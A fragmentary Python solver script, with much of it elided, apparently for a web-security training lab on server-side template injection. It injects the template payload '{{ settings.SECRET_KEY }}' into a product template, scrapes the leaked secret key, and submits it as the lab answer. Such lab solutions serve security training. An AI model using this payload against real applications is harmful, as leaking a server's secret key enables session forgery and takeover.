...
SUBMIT_SOLUTION_PATH = "/submitSolution"
...
def changed_preferred_name(sess: requests.Session, base_url: str, csrf_token: str, payload: str):
    ...
    changename_url = urljoin(base_url, PRODUCT_TEMPLATE_PATH)
    data = {
...
def save_new_template(sess: requests.Session, base_url: str, csrf_token: str, product_id: int, payload: str):
    ...
    secret = label.next_sibling.strip()
    return secret

def submit_solution(sess: requests.Session, base_url: str, solution_answer: str):
    url = urljoin(base_url, SUBMIT_SOLUTION_PATH)
    data = {
...
def main():
    ...
    parser = argparse.ArgumentParser(
        description="Lab: Server-side template injection with information disclosure via user-supplied objects"
    )
    ...
    print(f"[*] Changing template to read a secret SECRET_KEY...\n")
    payload = f'{{{{ settings.SECRET_KEY }}}}'
    solution_answer = save_new_template(sess, base_url, csrf_token, PRODUCT_ID, payload)
    ...
    submit_solution(sess, base_url, solution_answer)
    print(f"[*] Secret {solution_answer} submitted. See Lab solved.\n")
